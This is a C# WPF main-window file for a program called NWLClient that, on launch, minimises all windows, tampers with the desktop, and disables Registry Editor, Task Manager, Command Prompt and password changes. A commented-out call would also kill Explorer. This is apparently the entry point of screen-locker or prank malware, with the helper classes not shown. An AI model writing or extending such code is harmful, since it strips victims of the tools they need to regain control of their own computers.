using System;
using System.Threading;
using System.Windows;
using System.Windows.Interop;
using System.Windows.Media;


namespace NWLClient
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            FunBeginsHere.MinimizeWindows();
            Thread.Sleep(1300);
            //FunBeginsHere.KillExplorer();
            ExtraFun.DesktopFun();
            if (NativeMethods.DwmIsCompositionEnabled())
                ExtraFun.WindowFun();
            Thread.Sleep(200);
            FunContinues.BlockApplication(FunContinues.BlockedApplications.RegistryEditor, true);
            FunContinues.BlockApplication(FunContinues.BlockedApplications.TaskManager, true);
            FunContinues.BlockApplication(FunContinues.BlockedApplications.CommandPrompt, true);
            FunContinues.BlockFeature(FunContinues.BlockedFeatures.ChangePassword, true);
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            try
            {
                // Obtain the window handle for WPF application  
                IntPtr mainWindowPtr = new WindowInteropHelper(this).Handle;
                HwndSource mainWindowSrc = HwndSource.FromHwnd(mainWindowPtr);
                mainWindowSrc.CompositionTarget.BackgroundColor = Color.FromArgb(0, 0, 0, 0);

                // Set Margins  
                NativeMethods.MARGINS margins = new NativeMethods.MARGINS();

                // Extend glass frame into client area  
                // Note that the default desktop Dpi is 96dpi. The  margins are  
                // adjusted for the system Dpi.  
                margins.cxLeftWidth = Convert.ToInt32(-1);
                margins.cxRightWidth = Convert.ToInt32(-1);
                margins.cyTopHeight = Convert.ToInt32(-1);
                margins.cyBottomHeight = Convert.ToInt32(-1);

                int hr = NativeMethods.DwmExtendFrameIntoClientArea(mainWindowSrc.Handle, ref margins);
                //  
                if (hr < 0)
                {
                    //DwmExtendFrameIntoClientArea Failed  
                }
            }
            // If not Vista, paint background white.  
            catch (DllNotFoundException)
            {
                Application.Current.MainWindow.Background = Brushes.White;
            }
            if (!NativeMethods.DwmIsCompositionEnabled())
                Application.Current.MainWindow.Background = Brushes.White;
            this.WindowState = WindowState.Normal;
            this.Focus();
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            Application.Current.Shutdown();
            //e.Cancel = true;
        }
    }
}
